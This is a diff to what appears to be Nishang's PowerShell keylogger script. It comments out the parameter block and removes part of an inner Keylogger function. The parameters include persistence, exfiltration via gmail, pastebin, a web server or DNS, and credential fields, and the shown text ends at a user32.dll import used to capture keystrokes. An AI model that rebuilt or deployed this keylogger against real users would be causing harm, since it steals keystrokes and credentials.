@@ -63,70 +63,54 @@ http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
-        [Parameter(Parametersetname="exfil")]
-        [Switch]
-        $persist,
+    # [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
+        # [Parameter(Parametersetname="exfil")]
+        # [Switch]
+        # $persist,
 
-        [Parameter(Parametersetname="exfil")]
-        [Switch]
-        $exfil,
+        # [Parameter(Parametersetname="exfil")]
+        # [Switch]
+        # $exfil,
 
-        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
-        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
-        [String]
-        $CheckURL,
+        # [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
+        # [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
+        # [String]
+        # $CheckURL,
 
-        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
-        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
-        [String]
-        $MagicString,
+        # [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
+        # [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
+        # [String]
+        # $MagicString,
 
-        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
-        [String]
-        $ExfilOption,
+        # [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        # [String]
+        # $ExfilOption,
 
-        [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
-        [String]
-        $dev_key = "null",
+        # [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
+        # [String]
+        # $dev_key = "null",
 
-        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $username = "null",
+        # [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")]
+        # [String]
+        # $username = "null",
 
-        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $password = "null",
+        # [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
+        # [String]
+        # $password = "null",
 
-        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $URL = "null",
+        # [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
+        # [String]
+        # $URL = "null",
       
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $DomainName = "null",
+        # [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        # [String]
+        # $DomainName = "null",
 
-        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $AuthNS = "null"   
+        # [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        # [String]
+        # $AuthNS = "null"   
    
-    )
-
-
-
-$functions =  {
-
-function script:Keylogger
-{
-    Param ( 
-        [Parameter(Position = 0, Mandatory = $True)]
-        [String]
-        $MagicString,
-
-        [Parameter(Position = 1, Mandatory = $True)]
-        [String]
-        $CheckURL
-    )
+    # )
     
     $signature = @" 
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
